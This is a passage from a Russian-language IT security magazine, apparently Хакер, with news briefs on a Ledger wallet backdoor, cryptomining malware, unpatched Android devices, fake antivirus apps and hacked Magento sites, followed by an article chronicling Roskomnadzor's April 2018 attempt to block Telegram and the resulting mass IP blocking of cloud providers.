  помощью кошельки осу ществляют криптографическую аттестацию, и ком‐
  пания называет этот компонент Secure Element. Но защищенный микрокон‐
  троллер не поддерживает дисплеи, USB‐подклю чения и операции, тре‐
  бующие высокой пропускной способ ности. Из‐за этого инженеры компании
  были  вынуждены  добавить  устройствам  еще  один  микроконтроллер,
  STM32F042K6, который выступает своеобразным прокси и носит название
  MCU.





                          Схема работы MCU

  MCU служит промежуточным звеном между «железом» кошелька и Secure Ele‐
   ment, общаясь с USB‐хос том, встроенным дис плеем, а также кнопками
  устройства. Бэкдор Рашида вынуждает MCU демонс трировать Secure Element
  исходную, «чистую» прошивку, тогда как на самом деле код злоумышленника
  заставляет MCU тайно выполнять самые раз ные нелегитимные действия.
     Работу Рашида уже изучили извес тные ИБ‐эксперты, которые согласились
  с выводами молодого исследователя. Так, профес сор криптографии из Уни‐
  верситета Джонса Хопкинса Мэтт Грин (Matt Green) пишет:



         «[Раз работчики] Ledger пыта ются решить фундаментальную аппа рат-
        ную проблему. Им нужно проверять прошив ку, работа ющую на про-
        цес соре. Но их защищенный чип нес пособен увидеть код, запущенный
         на этом процес соре. Поэтому они вынуждены просить процес сор пре-
        дос тавить собс твенный код! Но это зам кну тый круг, так как данный
        процес сор может работать с недобросовес тным кодом, и, сле дова-
         тельно, его отве там нельзя верить. Это все рав но, что поп росить
         челове ка, который может быть прес тупником, пре дос тавить все дан-
        ные о криминальном прош лом: сис тема, пос троенная на доверии».





  →«Ни одна развитая страна не блокирует мессен джеры за отказ выдать спецслужбам ключи
  шифрования. Отмена права на кон фиденциаль ность — лекарство, которое опаснее самой
   болезни. Как только некая служба получает возможность бесконтрольно монито рить личную
   переписку граждан, очень скоро этот доступ оказывается в руках у третьих сторон — взят‐
   кодателей, хакеров, агентов других государств. В результате требование пре доставить универ‐
   сальные пути обхода шифрования через выдачу „ключей“ снижает информационную безопас‐
   ность как элит, так и общества в целом»
  — Павел Дуров о попытках Роскомнадзора блокировать Telegram и половину интернета





                                        Продолжение статьи →
← Начало статьи





 НИКАКОГО ДАРКНЕТА
 НА REDDIT
  После продолжительных обсуждений адми нистра ция Reddit внес ла изме‐
  нения в content policy ресурса, запретив про водить на Reddit сдел ки, связан‐
  ные с различными нелегальными товара ми и сервисами. Под запрет попали:
  оружие, наркотики (включая алкоголь и табак), краденое имущество, личные
  данные, фальшивые документы, а также платные сервисы, пред полагающие
  физический сексуальный контакт.
     Так как новые правила уже всту пили в силу, первыми оказались забанены
  сообщества (или, как их называют здесь, сабреддиты), пос вященные тор‐
  говым площадкам в даркнете: /r/DarkNetMarkets, r/xanaxcartel, r/DNMSuperlist
  и r/HiddenService.
     Стоит отметить, что сооб щес тво DarkNetMarkets всегда вызывало много
  споров и, в сущности, было одним из крупнейших в интерне те мест сбора
  наркоторговцев, хакеров и про чих киберпреступников, а также их клиентов.
  Именно здесь после ликвидации таких извес тных маркетплейсов, как Silk
  Road  и  Alphabay,  раз ворачивались  бурные  обсуждения,  пользовате ли
  делились мнениями о том, куда теперь перей дет торговля, а клиенты искали
  своих постоянных дилеров. Здесь же обсужда ли «кидал», качество приобре‐
   тенных товаров и проведенные сделки.
     Хотя на Reddit уже появился ряд новых сообществ, посвященных дар‐
  кнет‐маркетплейсам, вряд ли они продержатся долго — теперь администра‐
  ция сайта может заблокировать их при первых признаках нарушений.


 МИЛЛИОНЫ ДОЛЛАРОВ ЧЕРЕЗ СКРЫТЫЙ МАЙНИНГ
   Специалисты «Лаборатории Касперского» под готовили доклад, озаглавлен ный Mining is the new
   black («Майнинг — хит сезона»), посвященный рас тущей популярности майнинговой малвари
   среди преступников. Пользователи все чаще становятся жер твами рекламного и пиратско го
   программного обеспечения, контрафактных игр, которые активно используются преступниками
   для скрытого заражения компьютеров майнерами.

  В 2017 году атакам майнеров подверглись 2 700 000 мил лиона пользователей. Это почти
   на 50% больше, чем в 2016 году (1 870 000 пользователей).





   При этом 80% преступников исполь зуют легитим ные опен сорсные майнеры и пользуются
   услугами известных майнинговых пулов. Чаще всего злоумышленники предпочитают работать
   с Nanopool.





   По данным аналитиков, только за пос ледние шесть месяцев 2017 года прес тупни ки «зарабо‐
   тали» таким образом несколько миллионов дол ларов. Майнеры, по сути, пришли на сме ну
   вымогательскому ПО и имеют схожие механизмы монетизации.
       Так, шифровальщик заражает сис тему, шифрует файлы, и преступники получают от жертвы
   выкуп. В случае с майнером малварь также заражает систему, использует мощности CPU
   или GPU жертвы для «добычи» криптовалюты, а прес тупники получают прибыль. В конечном
   счете злоумышленникам остается лишь воспользоваться услугами обменника, конвертировав
   криптовалюту в живые деньги.





                                  Схема монетизации





 ПАТЧИ, КОТОРЫХ НЕ
 БЫЛО
  Известные ИБ‐эксперты, специалисты Security Research Labs Карстен Нол
   (Karsten Nohl) и Якоб Лелл (Jakob  Lell) предста вили интересный доклад
  на конференции Hack In The Box. Исследователи об наружили, что многие
   крупные произво дители устройств на Android, в том числе компании Samsung,
   Xiaomi, OnePlus, Sony, HTC, LG, ZTE и Huawei, лишь создают видимость выхода
   патчей, тогда как на самом деле многие баги оста ются неисправленны ми.
    Проблема обновле ния Android‐устройств всегда стояла очень остро.
  В настоящее время раз работчики Google каждый месяц выпускают набор
  обновлений безопасности для своей ОС, далее эти патчи попадают в руки
  производителей многочисленных устрой ств, а те дол жны самостоятельно
  адаптировать патчи для своих продуктов и донес ти их до конечных поль‐
  зователей. К сожале нию, фрагмента ция рын ка по‐прежнему велика, а вен‐
  доры по‐разному отно сятся к своим обязанностям. Из‐за этого многие
  устройства не получают важных обновлений вовсе.





      Цепочка, которую проходят обновления до конечного пользователя

  Нол и Лелл, однако, обнаружили, что и без того выглядящее печально
  положение вещей на самом деле еще хуже. На протяжении двух лет спе‐
  циалисты тщательно  анализирова ли  состав  обновле ний  безопасности,
  выпускаемых крупнейшими производителями устройств на базе Android,
  и проделали огромную работу, изучив свыше 1200 смартфонов.
     Как показало исследование, многие производители хитрят во время
  выпуска обновле ний. Хотя они утвержда ют, что их устройства получили все
   актуальные патчи, это ложь, так как некоторые исправления по неиз вестным
  причинам «выпадают» из списков и в итоге вообще не доходят до поль‐
  зователей, о чем те даже не могут узнать. Эксперты объ ясняют, что порой
  некоторые патчи не получа ют даже устройства Pixel.



         «Иногда эти ребята прос то изме няют дату, не уста нав ливая никаких
         патчей. Видимо, дело  в мар кетинге, они прос то  ста вят уровень
        обновле ний на произвольную дату, которая выглядит луч ше все го, —
         рас ска зали экспер ты. — Мы обна ружили, что некоторые производите-
        ли не уста новили ни единого патча, но меняли даты выхода обновле-
        ний на протяже нии многих месяцев».

  Чаще всего проблема носит менее мас штабный характер. Так, на большинс‐
   тве устройств Sony и Samsung может не хватать лишь пары обновлений, что
  может быть простой слу чайностью. Однако в некоторых случаях все обстоит
  гораздо хуже. Так, смартфоны J3, выпущенные Samsung в 2016 году, дол жны
  иметь все обновле ния безопасности за 2017 год, но на самом деле 12 патчей
  не хватает, причем два исправления кри тичес кие.





                    Некото рых патчей не хватает

  При этом Нол и Лелл объясня ют, что зачастую «бутылочным горлышком»
  на пути обновлений становятся производители чипсетов, а не сами изготови‐
   тели смартфонов. К примеру, компания Mediatek зачастую «забывает» о 9–
  10 патчах, которые выходят зна чительно поз же заявленных дат.
    В целом аналитики Security Research Labs приш ли к сле дующим выводам
  относительно крупных производителей:
   • 0–1 пропущенный патч: Google, Sony, Samsung, Wiko Mobile;
   • 1–3 пропущенных пат ча: Xiaomi, OnePlus, Nokia;
   • 3–4 пропущенных пат ча: HTC, Huawei, LG, Motorola;
   • 4 и более пропущенных пат ча: TCL, ZTE.

  Для проверки устрой ств на предмет уста новленных патчей исследователи
  создали специальное бесплатное приложение SnoopSnitch, которое поз‐
  воляет узнать, какие исправления на самом деле уста новлены на устройстве.


  7 000 000 ЧЕЛОВЕК ИСПОЛЬЗОВАЛИ ФЕЙКОВЫЕ АНТИ‐
  ВИРУ СЫ

   Аналитики ESET обнаружили в Google Play сразу 35 рекламных приложе ний, замаскированных
   под антивирусы. Сум марно подделки загрузили око ло 7 000 000 человек. Исследователи пре‐
   дупреждают, что для введения пользователей в заблужде ние рекламные приложения ими тиру‐
   ют настоящие продукты для безопасности, то есть фальшивые анти вирусы в какой‐то мере
   действительно работают.


  Однако «механизмы детектирования» фальшивых антивирусов примитивны и неполны, что при‐
   водит к постоянным ложным срабатываниям, а нас тоящее вредонос ное ПО легко избе жит
   обнаружения. Подделки не имеют функциональнос ти шифровальщиков, банкеров или дру гих
   вредоносных возможностей, но мешают пользователям ложными срабатывани ями и показом
   рекламы, а также создают неоправдан ное ощущение безопасности.





ВАШ ANDROID НЕ
 СЕРТИФИЦИРОВАН
  Компания Google начала отказывать несертифици рованным устройствам
   в доступе к своим приложениям и сервисам.
    Дело в том, что исходный код Android Open Source Project бесплатный
  и опенсорсный, фактически им могут пользовать ся все желающие. Однако
  сервисы и официальные приложения Google (такие как Play Store, Gmail,
  Google Maps) «в комплект» не входят и сво бодными не являются. Google
  лицензирует эти приложения для произво дителей устройств, которые, в свою
  очередь, в ответ дол жны выполнить ряд требова ний компании. В частности,
  коллекция дефолтных приложений для Android должна поставляться только
  вся и полностью, приложения соот ветс твовать определенным условиям раз‐
  мещения, а также само устройство, на которое приложения устанавливаются,
  должно соответствовать длинному списку требований к совместимости.
    Производители, чьи гаджеты не прошли такую сертификацию, не имеют
  права использовать торговую марку Android и, по сути, работают с форками
  ОС Google. Наибо лее известным форком такого рода можно назвать устрой‐
   ства компании Amazon (в частности, серию Kindle Fire). К тому же большинс‐
   тво китайских гаджетов тоже работа ют на базе форков Android.
    И хотя официально приложения Google могут рас пространяться лишь
   в предустановленном на устройство виде, пря мо «из коробки», они также
  свободно доступны в Сети, на мно жес тве форумов, сай тах кастомных про‐
  шивок, в сторонних каталогах приложений и так далее. Таким образом,
  при желании любой пользователь и даже про изводитель, не прошедший
  «сертификацию», может установить приложения Google на свой гаджет.
    По данным издания XDA Developers, с середи ны марта 2018 года раз‐
  работчики Google начали бороться с таким поведением более агрессивно.
  Теперь попытка установить официальные приложения Google на несер‐
  тифицированное  устрой ство обо рачивает ся ошиб кой.  Google  попросту
  не позволяет залогинить ся в свои сервисы во время установки, сообщая, что
  данное устройство не проходило сертифика цию.





                  Скромное предупреждение от Google

  Вариантов решения проблемы пользователю предлагают немного — в сущ‐
   ности, рядовому юзеру остается лишь жаловаться производите лю. Впрочем,
   как можно увидеть на иллюстрации выше, в самом низу сообщения все же
   есть опция для поль зователей кастомных Android‐прошивок. Google пред‐
   лагает зарегистрировать такие устройства по адресу g.co/androiddeviceregis‐
   tration, привязав их к своему акка унту Google. Правда, для этого потребу ется
  ввести уникальный идентификатор (Android ID) гаджета, что, к сожалению,
  может стать проб лемой для неподготовленных пользовате лей. Android ID
   устанавливается при первом запуске устройства (и генерируется заново пос‐
  ле сброса к заводским нас тройкам), представлен в шестнадцатеричном (hex)
   виде, и увидеть его можно лишь при помощи специальных утилит.
    Еще одной проб лемой может стать тот факт, что вручную Google поз воля‐
   ет зарегистрировать максимум 100 устройств на одного пользователя. То
   есть любите ли экспериментировать, менять прошивки и устройства могут
  исчерпать этот лимит и в итоге останутся без официальных приложений
   Google.


 БОЛЕЕ 1000 САЙТОВ НА MAGENTO ВЗЛОМАНЫ
 И ЗАРАЖЕНЫ

   Специалисты Flashpoint предупредили о ком прометации более 1000 сайтов, работающих
   под управлением Magento. Злоумышленники не только похищают данные о банковских картах
   пользователей этих ресурсов, но и заражают сайты вредоносными скриптами, в том числе
   для майнинга криптовалюты, или используют сайты для хранения других вредоно сов.


   Массовый взлом — вовсе не следс твие какой‐либо уязвимости в популярном решении
   для электронной коммерции. Большая часть ресурсов взломана посредством обычного брут‐
   форса, то есть преступники подбирали учетные дан ные к аккаунтам администраторов, переби‐
   рая наиболее распространенные сочетания и ком бинации по умол чанию. Помимо Magento,
   похожим атакам подвергаются Powerfront CMS и OpenCart.
HEADER





                                 Мария «Mifrill» Нефёдова
                                                  nefedova@glc.ru

РОСКОМНАДЗОР
   VS       TELEGRAM





         ХРОНИКИ ОДНОГО
         ПРОТИВОСТОЯНИЯ




Противос тояние Роскомнадзора и мессенджера Telegram,
берущее начало еще в прошлом году, продолжается. Хотя
с 16 апреля 2018 года Роскомнадзор начал ограничивать
доступ к мес сенджеру на территории России, для большинс‐
тва   пользователей   Telegram   по‐прежнему  доступен
без использования VPN и прок си, чего нельзя сказать о дру‐
гих ресурсах и сервисах. Подводим промежуточные итоги.


ЧТО ПРОИСХОДИТ?
13 апреля 2018 года в Таганском суде города Москвы состоялось слу шание
дела о блокировке Telegram. Суд заключил, что необ ходимо установить огра‐
ничение доступа к мессенджеру на территории России, причем судья подчер‐
кнула, что решение подлежит немедленному исполнению. С понедельника,
16 апреля 2018 года, Рос комнадзор на чал попытки блокировать работу мес‐
сенджера. Однако спустя полторы недели после начала этой активности
Telegram по‐прежнему доступен без использования VPN и прокси, чего нель‐
зя сказать о других ресурсах и сервисах.


Крат кая пре дыс тория
Противостояние компании Telegram Messenger LLP с рос сийскими надзорны‐
ми органами началось еще в прошлом году. Напомню, что Telegram был
зарегистрирован в реес тре организаторов распространения информации
летом 2017 года (после продолжительного скандала), но тогда Павел Дуров
подчеркивал, что компания тем самым не берет на себя никаких допол‐
нительных обязательств и не собирается предоставлять кому‐либо дос туп
к переписке пользователей.
  В итоге 16 октября 2017 года мировой судья Мещанского района Москвы
Юлия Данильчик оштра фова ла мессенджер Telegram на 800 000 рублей
за совершение административного правонарушения: отказ передать ФСБ
клю чи шифрования  от переписки  пользователей. 800 000  рублей —
это минимальное наказа ние, предус мотренное в статье 13.31 (часть 2.1)
КоАП РФ (Неисполнение орга низатором рас пространения информации
в  сети  «Интернет»  обязанности  предос тавлять  в федеральный  орган
исполнительной власти в области обеспечения безопасности информацию,
необходимую для декодирования принимаемых, передаваемых, доставля‐
емых и (или) обрабатываемых электронных сообщений).
  После этого Telegram Messenger LLP заручилась поддержкой юристов
международной правозащит ной группы «Агора» и обратилась в суд с тре‐
бованием признать незаконным приказ ФСБ от 19 июля 2016 года № 432 (Об
утверждении  порядка  представления  орга низаторами  распространения
информации  в информа ционно‐телекоммуника ционной  сети  «Интернет»
в Федеральную службу безопас ности Рос сийской Федерации информации,
необходимой для декодирова ния принимаемых, передаваемых, доставля‐
емых и  (или) обрабатываемых  электронных сообщений  пользователей
информационно‐телекоммуника ционной сети «Интернет»).
  Компания попыталась доказать, что данный приказ противоречит закону
об информации, закону о ФСБ, а также был при нят неуполномоченным орга‐
ном с превышением полномочий. 20 марта 2018 года Telegram проиграла
этот процесс, после чего предста вители Роскомнадзора обратились в суд
с требованием о блокировке. Как уже было ска зано выше, 13 апре‐
ля 2018 года Таганский суд города Мос квы принял решение блокировать
мессенджер, причем судья Смолина подчеркнула, что решение подлежит
немедленному исполнению.


16 апреля Роскомнадзор приступил к мас совым блокировкам IP‐адре сов
компаний Amazon и Google. В сущности, в более масштаб ном виде пов‐
торилась ситуация, недавно возникшая из‐за интернет‐рации Zello. Напомню,
что тогда разработчики Zello прибега ли к использованию услуг Amazon Web
Service, постоянно меняя адреса, чтобы избе жать блокировок. В итоге Рос‐
комнадзор начал блокиро вать адреса AWS, и представители Amazon поп‐
росили Zello прекратить использовать Amazon AWS для подобной деятель‐
ности.
   Теперь из‐за аналогичной активнос ти Telegram под блокировку попали
миллионы адресов, принадлежащих компаниям Amazon, Google, Microsoft,
крупным хостинг‐провайдерам Digital Ocean, Hetzner, OVH и так далее (отсле‐
живать выгрузку бло кируемых IP можно на этом сайте, созданном энтузиас‐
тами).
   Хотя массовые блокировки почти не сказыва ются на работе Telegram, они
предсказуемо мешают функционированию дру гих сайтов, систем и сервисов.
К примеру, прак тически сразу после начала бло кировок в Viber перестали
работать голосовые звонки. Но представители регулятора сообщили, что
будут продолжать действовать, как запланировано:



      «Рос комнад зор принима ет и будет принимать все необходимые меры
      для выполнения решения суда, в том чис ле связанные с огра ниче нием
      дос тупа к интернет‑ресур сам, способс тву ющим функционирова нию
      сер висов ком пании Telegram Messenger Limited Liability Partnership», —
       говорят в пресс‑службе Рос комнад зора.


КТО ПОСТРАДАЛ ОТ БЛОКИРОВОК?
Все последние недели Рос комнадзор продолжал активно «расширять» бло‐
кировку. В итоге, по данным на 26 апреля, Рос комнадзор внес в реестр зап‐
рещенных сайтов поч ти 18 миллионов IP‐адресов, чис ло которых в какой‐то
момент  превысило  количес тво  пользователей  Telegram  в  России —
по информации Павла Дурова, мес сенджером в России пользуются око‐
ло 15 миллионов человек.





Стоит ли говорить, что такой мас штаб ный бан «облаков» Amazon и Google
не мог не сказаться на работе раз личных служб, сервисов и сай тов, ведь
услугами этих компаний пользуются фирмы и частные лица по все му миру,
которых не могли не коснуть ся бло кировки целых подсетей.
   Так, после 16 апреля компании и пользователи начали сообщать о всевоз‐
можных неполадках. К примеру, о проб лемах писала онлайн‐школа англий‐
ского языка Skyeng;  также недос тупны ми ока зались интернет‐магазины
и службы доставки; у Viber по‐преж нему проб лемы с голосовыми вызовами
и отправкой файлов. Кроме того, пользователи в социальных сетях писали
о сбоях в работе кассовых аппаратов в торговых сетях «Дикси» (представите‐
ли ретейлера эту информацию опровергают), «Пятерочка»,«Монетка» и «Бур‐
гер Кинг».
   Вскоре проблем стало еще больше, хотя нужно отме тить, что доступность
или недоступность сервисов и сайтов зависит от конкретных провайдеров
и регионов. Как бы то ни было, пользователи жалуются на перебои в работе
и недоступность  Twitch,  PlayStation  Network, Steam,  Battle.net, а  также
популярных онлайновых игр  Fortnite, Playerunknown’s Battleground, World‐
OfWarships, Guild Wars 2 и EVE Online.





Кроме того, в СМИ и социальных сетях то и дело появляются сообщения
о проблемах в работе онлайн‐банкингов, Slack, Netﬂix, Evernote, Skype, Mi‐
crosoft Oﬃce 365 и обновлений Windows, поис ковика DuckDuckGo и множес‐
тва других ресурсов, включая сервисы видеонаблюдения и управле ния умным
домом. Также известно, что в Национальную ассоциацию дистанционной тор‐
говли (НАДТ) с подоб ными проблемами об ратились как минимум девять
онлайн‐магазинов. Поступали сообщения о сбоях в работе сайтов «Говорит
Москва» и RussiaToday.
  Нужно сказать, что сайты Роскомнадзора и Ростелекома подвергаются
DDoS‐атакам, из‐за чего они по‐прежнему могут быть недоступны.
  В ответ на все большее количес тво жалоб на недоступность тех или иных
ресурсов представители Роскомнадзора соз дали «горячую линию» по бло‐
кировкам — завели почтовые ящики hotlinerkn@rkn.gov.ru и hotlinerkn@yan‐
dex.ru. На эти адреса предлагается сообщать о фактах блокировки «доб‐
росовестных ресурсов». Сооб щения пообещали проверять и, при необ‐
ходимости, давать публичный ответ. Также представители регулятора ре‐
комендуют обращаться  в РОЦИТ  (Региональный общественный  центр
интернет‐технологий).
  Кроме   того,  предста вители  ведомства   выпустили  целый   ряд
пресс‐релизов, в которых заявляют: «В связи с распространением информа‐
ции о том, что в связи с мерами по ограничению доступа к Telegram якобы
массово страдают сторонние ресурсы, а также по сообщениям, поступившим
на „горячую линию“, про ведена проверка». Утверждается, что СМИ нужно луч‐
ше проверять информа цию, а ведомс тво не ограничивает доступ к сле‐
дующим ресурсам.





Также в Роскомнадзоре объясняют, что регулятор «сначала „раз бирает“ под‐
сеть, смотрит, не находится ли там круп ных, соци аль но значимых ресурсов,
и только после этого отправляет ее на выгрузку».
  В свою очередь, предста вители международной правозащитной группы
«Агора» организовали горячую линию для сервисов, стол кнувшихся с тех‐
ническими проблемами из‐за блокировок миллионов IP‐адресов.



       «„Агора“ запус кает пра вовой сап порт для помощи вла дельцам сайтов,
      сер веров, дата‑центров, онлайн‑сер висов, столкнув шихся с техничес-
      кими траблами вследс твие активнос ти Рос комнад зора. Писать нужно
     нашему интернет‑гуру Дамиру Гайнутдинову в Telegram/Twitter @snor-
        ri51, в Facebook, на поч ту damir51@gmail.com. Если вы получили уве-
     дом ление Рос комнад зора, вам грозят блокиров кой или уже блокиру-
      ют, пишите, пос тара емся помочь», — объявил гла ва «Агоры» Павел
      Чиков.

Известно, что предложением юристов уже вос поль зовались порядка 60 ком‐
паний. В основном это владельцы маленьких бизнесов — интернет‐магази‐
нов, служб доставки, прокси‐серверов.


ЧТО ДАЛЬШЕ?
Недавно в разговоре с изда нием The Bell глава Роскомнадзора Александр
Жаров сооб щил, что «деградация Telegram сейчас составляет 30%», что бы
это ни значило. Напом ню, что для большинс тва пользователей мессенджер
по‐прежнему доступен без использования VPN и прокси‐серверов.
  Кроме того, Жаров утверждает, что претензий от онлайновых сервисов,
пострадав ших в резуль тате «ковровой блокировки» IP‐адре сов, мало, а зна‐
чимых платежных ресурсов среди них нет вовсе. По его словам, все сайты,
попавшие под блокировку случайно и сообщившие об этом на горячую линию
РКН, сразу же разблокиру ются.
  Вместе с этим подтвердилось, что Amazon и Google были проинформи‐
рованы о значительном количестве их IP‐адресов, выгруженных на блокиров‐
ку. Жаров уверяет, что «никаких соци ально зна чимых ресурсов на этих IP‐
адресах не содержится», а с представителями Google и Amazon «ведется
диалог».



      «Telegram должен быть убран из App Store и Google Play, это пер вое.
      Второе — аме риканские ком пании должны соз дать техничес кие усло-
       вия, которые сде лают сер вис недос тупным на тер ритории Рос сии.
      Во‑пер вых, как я уже ска зал, ведется диалог. Во‑вторых, и для Ama-
       zon, и для Google это, безус ловно, серьезный вызов: если рас смат-
      ривать набор IP-адре сов, то, нап ример, 6 миллионов IP Amazon —
      это прак тичес ки половина из всех, которые у них в принципе есть.
      Все го их поряд ка 13 миллионов. То есть по большому сче ту они сей-
      час реша ют воп рос, будут ли работать на тер ритории РФ или нет», —
      рас ска зал Алек сандр Жаров жур налис там «Из вестий».

Между тем на официальном сайте Роскомнадзора появилась интересная
новость. Сообщается, что 25 апреля 2018 года Роскомнадзор совместно
с РОЦИТ провел встречу с предста вителями IT‐индус трии по вопросам, свя‐
занным с исполнением судеб ного решения об ограниче нии доступа к мес‐
сенджеру Telegram. Регулятор по‐прежнему пытается наладить рабочие кон‐
такты с Amazon и Google, чтобы компании прекратили пре доставлять Telegram
IP‐адреса «с целью работы мессенджера в России».
  В ходе встречи замес титель руководителя Роскомнадзора Вадим Суб‐
ботин отметил, что контакты с Amazon пока не привели к положительным
результатам, вероятно, по неким политическим при чинам. А вот с компанией
Google, по его словам, вза имо действие стало более конструктивным и начат
предметный диалог.
  На совещании было подчеркнуто, что согласно решению суда обя зан‐
ность прекратить создавать технические усло вия для функционирования
Telegram в России возложена не только на Роскомнадзор, но и на «иные
лица», в том числе хостинг‐провайдеров.
  Вместе с тем в Роскомнадзоре подтвердили, что им известно о том, что
мессенджер использует  push‐уведом ления  (подробнее об этом можно
почитать, к примеру, здесь), что бы сооб щать мобильным версиям своих при‐
ложений информацию о новых настройках и серверах. Эти уведомления рас‐
пространяются с серверов Google и Apple, и «избавиться» от них не так прос‐
то.



     «Мы в кур се этой технологии, IP-адре са ее идентифицирова ны. В нас-
      тоящее вре мя мы раз рабаты ваем техничес кое решение в отношении
      этой технологии обхода блокировок», — проком ментировал Жаров.

Нужно отме тить, что сейчас первым воп росом на повестке дня для Рос‐
комнадзора, очевидно, стоит удаление Telegram из каталогов приложе ний
App Store и Google Play. Более того, предста вители регулятора требуют
убрать установоч ные файлы мес сенджера и с других, неофициальных пло‐
щадок. Так, уведомление от Рос комнадзора уже получил сервис APK Mirror.
Хуже того, на 4PDA уже закрылись соот ветс твующие ветки форума, где можно
было найти ссылки на ска чивание официальных клиентов для iOS и Android,
а все обсужде ния блокировки Telegram были уда лены. Теперь эту информа‐
цию можно найти толь ко в кеше Google.
  При этом Жаров заверил, что у ведомства нет претензий к простым поль‐
зователям:



      «Ни у РКН, ни у ФСБ, ни у государс тва нет воп росов и пре тензий
       к тем людям, которые в Telegram занима ются обыч ной жизнью — соз-
      дают ботов, ведут каналы. Воп рос не к пользовате лям, воп рос к адми-
      нис тра ции мес сендже ра. Гос подин Дуров, как ода ренный мар кетолог
      и пиар щик, „переводит стрелки“ на аудиторию и соз дает конфликт
     между органами влас ти и аудиторией. А его как раз и нет. Попытки
      некоторых Telegram-каналов приз вать к мас совому ска чива нию VPN —
      это попытка выс тавить себя элитой. „Мы на балу, а вы, кто не ска чал,
      наблюдайте в окош ко“. Одна ко мне кажется, для людей должно быть
      важно, с кем они находятся рядом — с тер рорис тами или нор маль-
     ными людьми».

В ночь с 21 на 22 апреля российские пользователи обратили внимание, что
Google работает с перебоями или не работает вовсе («задело» как сам поис‐
ковик, так и другие сервисы компании, к при меру почту, переводчик, аналити‐
ку). Днем 22 апреля Роскомнадзор официально подтвердил, что ограничи‐
вает доступ к IP‐адресам Google, так как компания «не удовлетворила тре‐
бования Роскомнадзора и в нарушение вердикта суда продол жает позволять
компании Telegram Messenger Limited Liability Partnership использовать свои
IP‐адреса для осуществления деятельнос ти на территории России».





Однако после многочисленных сооб щений о проблемах, пос тупающих
от пользователей, пред ставители Рос комнадзора опровергли информацию
о недоступности сервисов Google. Ведомс тво утверждает, что не ограничи‐
вает доступ к Gmail, YouTube, веб‐версиям Google Play, Google Drive и re‐
CAPTCHA (1, 2, 3).
  Тем временем, по данным операторов неофициальной копии выгрузки
реестра, в «черных списках» находятся уже более 100 адре сов Google.





                                     Продолжение статьи →
HEADER               ← НАЧАЛО СТАТЬИ
                 VS   РОСКОМНАДЗОР
          TELEGRAM
              ХРОНИКИ ОДНОГО ПРОТИВОСТОЯНИЯ





А ЧТО ДУРОВ?
Павел Дуров определен но не собирается уступать давлению властей. На сво‐
ей странице «ВКонтакте» глава Telegram неоднократно благодарил поль‐
зователей за поддержку, а также писал, что уже начал выплачивать Bitcoin‐
гранты администраторам VPN и прокси‐серверов, «в рамках Цифрового Соп‐
ротивления — децентрализованного дви жения в защиту цифровых свобод
и прогресса». Кроме того, Дуров заявил о сво ем намерении и далее тратить
на поддержание доступнос ти Telegram миллионы долларов.





В своем Telegram‐канале Дуров благода рил не только пользовате лей, но и
компании Apple, Google, Amazon и Microsoft за то, что те не стали «принимать
участие в политической цензуре». Более того, здесь Дуров пишет, что пока
российских пользователей пока Telegram не ста ло меньше (по информации
СМИ, их стало только больше, а количес тво подписчи ков у большинства рус‐
скоязычных каналов рас тет).
  Подводя итоги первой недели блокировок, Дуров писал: «Мы продер‐
жались 7 дней под самым масштабным актом интернет‐цензуры за историю
России». Более  того, он призвал  «всех,  кто поддерживает свободный
интернет» запустить из окна бумажный самолетик, а позже предложил сде‐
лать эту акцию еженедель ной и назвал новую дату запуска бумажных самоле‐
тиков: 29 апреля, вновь в 19:00 по мес тному времени.





Происходящее вызвало интересную реакцию со стороны авторов фильма
«Майор Гром: Чумной доктор», сня того по мотивам комиксов издательства
Bubble. Дело в том, что еще прошлой осенью вышел тизер картины,
в котором запуск бумажных самолетиков из окон в знак протеста фактически
был центральным элементом.
  В официальной группе Bubble «ВКонтакте» пос ле сообщения Дурова
появилась эта запись, а после акции с запуском самолетиков представители
Bubble официально объявили дату выхода филь ма, приурочив анонс к «сегод‐
няшнему событию».





Интересно, что тем же вечером на Life.ru (осно ватель ресурса — Арам Габ‐
релянов, отец Артема Габрелянова, гла вы изда тельства Bubble) появил ся
материал, в котором Павла Дурова открыто обвиняют в плагиате и том, что он
«когда‐то скопировал Facebook, затем скопировал Whatsapp, теперь копиру‐
ет чужие комиксы и косплеит злодея из серии Bubble „Чумной доктор“».
  Ирония ситуации заключа ется в том, что еще на Comic Con Russia, где
впервые был показан тизер филь ма «Майор Гром: Чумной доктор», во время
пресс‐конференции с представителями Bubble не мог не прозвучать вопрос
о параллелях между Чумным доктором и Алексеем Навальным. Тогда авторы
со смехом отве тили журналистам, что комиксы про майора Грома вышли
задолго до того, как Навальный начал развивать активность в интернете, и,
возможно, это он вдохновлялся «Майором Громом», а не наоборот. Кроме
того, они отметили, что пять лет назад персонаж Чумного доктора и вовсе
был аллюзией на Павла Дурова. Дело в том, что в комиксах, в отличие от гря‐
дущей картины, Чумной доктор действитель но явля ется создателем социаль‐
ной сети «Вместе», так что параллели не заметить трудно.
  Но вернемся от комиксов к реальнос ти и последне му на данный момент
сообщению, опубликованному Павлом Дуровым. В этом посте глава Telegram
продолжает отстаивать свою точку зрения и пишет:



      «Эту неделю мы боролись не с Рос комнад зором или ФСБ. Мы
      боролись за циф ровое будущее Рос сии. Свобод ный интернет и око-
      неч ное шиф рование — неотъемле мые час ти этого будуще го. Ни одна
      раз витая стра на не блокиру ет мес сендже ры за отказ выдать спец-
      службам клю чи шиф рования. Отме на пра ва на конфиденциальность —
      лекарс тво, которое опас нее самой болез ни.
         Как только некая служба получа ет воз можность бес контрольно
      мониторить лич ную перепис ку граждан, очень скоро этот дос туп ока-
      зыва ется в руках у третьих сторон — взяткодате лей, хакеров, агентов
      дру гих государств. В результате тре бова ние пре дос тавить универ-
      сальные пути обхода шиф рования через выдачу „клю чей“ снижает
     информа ционную безопас ность как элит, так и общес тва в целом».

В конце сообщения Дуров также про сит всех, у кого есть «инсай ды о при‐
чинах, планах и методах блокировки» мессенджера, обращаться по адресу
arequest2@gmail.com.


ЮРИДИЧЕСКИЙ АСПЕКТ
Нужно сказать, что еще 17 апреля 2018 года юристы «Агоры» обжаловали
немедленное исполнение решения о бло кировке Telegram в Мосгорсуде.
Приведенный ниже документ, поданный в суд, раз местил на своем канале
глава «Агоры» Павел Чиков.





Действия Роскомнадзора осудили не только предста вители многочисленных
правозащитных организа ций (к примеру, «Репортеры без границ» и ОБСЕ),
но даже ООН. Так, официальный представитель Управления верховного
комиссара ООН по правам человека Руперт Колвилл заявил, что при судеб‐
ном разбирательстве по делу Telegram не были соблюдены международные
стандарты в области прав человека:



      «В слу чае с шестью лицами, о которых идет речь, похоже, отсутс тво-
      вали необходимые юридичес кие гарантии, в час тнос ти рас поряже ние
